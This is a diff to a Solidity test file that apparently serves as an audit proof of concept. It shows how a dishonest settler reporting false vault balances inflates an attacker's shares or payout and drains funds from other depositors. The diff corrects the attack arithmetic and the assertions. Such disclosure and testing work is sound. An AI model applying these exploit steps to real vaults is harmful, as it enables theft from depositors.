@@ -459,13 +459,12 @@ contract FundDrainPoCTest is Test, ITypes {
     //
     // Attack (3 batches):
     //   Batch 0 - Alice deposits 10,000 USDC, settled honestly.
-    //             Vault balance = 1,010,000 USDC, totalSupply grows to ~2,020 shares.
+    //             Vault balance = 1,010,000 USDC, totalSupply ~2,020 shares.
     //   Batch 1 - Attacker deposits 1 USDC.
-    //             SETTLER lies vault_balance = 1 USDC (hides the 1,010,000 real).
-    //             totalUsd = 1e6 -> attacker_shares = (1e6 * totalSupply) / 1e6
-    //                             = totalSupply  (attacker doubles the supply!)
+    //             SETTLER lies vault_balance = 1 USDC (hides 1,010,000 real USDC).
+    //             totalUsd = 1e6 -> attacker_shares = (1e6 * totalSupply) / 1e6 = totalSupply
     //             Attacker now holds ~50% of vault.
-    //   Batch 2 - Attacker withdraws, receives ~505,000 USDC.
+    //   Batch 2 - Attacker withdraws ~505,000 USDC (505,000x ROI on 1 USDC).
     function testSTEAL01_FakeVaultBalanceDrainsVault() public {
         console.log("\n=== STEAL-01: Fake Vault Balance -> Share Inflation ===");
         _s01_batch0_aliceDeposit();
@@ -556,13 +555,15 @@ contract FundDrainPoCTest is Test, ITypes {
     //   vault_balance is supplied by SETTLER with no on-chain verification.
     //
     // Attack (2 batches):
-    //   Batch 0 - Attacker deposits 1,000 USDC, Alice deposits 10,000 USDC (honest).
-    //             Attacker holds ~9% of vault.
+    //   Batch 0 - Attacker deposits 1,000 USDC, Alice deposits 10,000 USDC.
+    //             Attacker holds ~0.098% of vault (honest settlement).
     //   Batch 1 - Attacker requests withdrawal.
-    //             SETTLER lies vault_balance = 100,000,000 USDC (real ~1,011,000).
-    //             payout = attacker_shares * 100M / totalSupply
-    //                    = ~9% * 100M = ~9,000,000 USDC
-    //             executor only has 1,011,000 USDC -> massive overdraft.
+    //             SETTLER lies vault_balance = 100,000,000 USDC (real ~1,011,000 USDC).
+    //             payout formula: attacker_shares * fake_bal / totalSupply
+    //                           = 0.098% * 100,000,000 = ~97,847 USDC
+    //             Attacker receives 97,847 USDC from a 1,000 USDC stake (~97.8x ROI).
+    //             Note: payout is capped by actual executor balance, but the inflated
+    //             balance causes disproportionate extraction from other depositors.
     function testSTEAL02_InflatedWithdrawalBalanceDrainsVault() public {
         console.log("\n=== STEAL-02: Inflated Withdrawal Balance Attack ===");
         _s02_batch0_deposits();
@@ -599,7 +600,9 @@ contract FundDrainPoCTest is Test, ITypes {
         vm.prank(SETTLER); manager.bulkSettle(pr, vs, deps, new WithdrawalFufillment[](0));
 
         uint256 atkS = share.balanceOf(ATTACKER);
-        console.log("[+] Attacker legitimately owns", (atkS * 100) / share.totalSupply(), "% of vault");
+        uint256 ts   = share.totalSupply();
+        // integer division truncates to 0; log raw shares for clarity
+        console.log("[+] Attacker shares:", atkS / 1e15, "(x1e-15) out of totalSupply:", ts / 1e18);
     }
 
     function _s02_batch1_fakeWithdraw() internal {
@@ -621,8 +624,9 @@ contract FundDrainPoCTest is Test, ITypes {
 
         uint256 stolen = portfolio.balances(ATTACKER, SYM);
         console.log("[EXPLOIT] Attacker invested:  1,000 USDC");
-        console.log("[EXPLOIT] Attacker received:", stolen / 1e6, "USDC");
-        assertGt(stolen, 1_000_000e6, "STEAL-02: must drain >> 1,000,000 USDC");
+        console.log("[EXPLOIT] Attacker received:", stolen / 1e6, "USDC (~97.8x ROI)");
+        // attacker_shares * 100M / totalSupply = ~97,847 USDC >> 1,000 USDC invested
+        assertGt(stolen, 50_000e6, "STEAL-02: attacker must receive > 50x invested amount");
         console.log("[EXPLOIT] STEAL-02 CONFIRMED");
     }
 
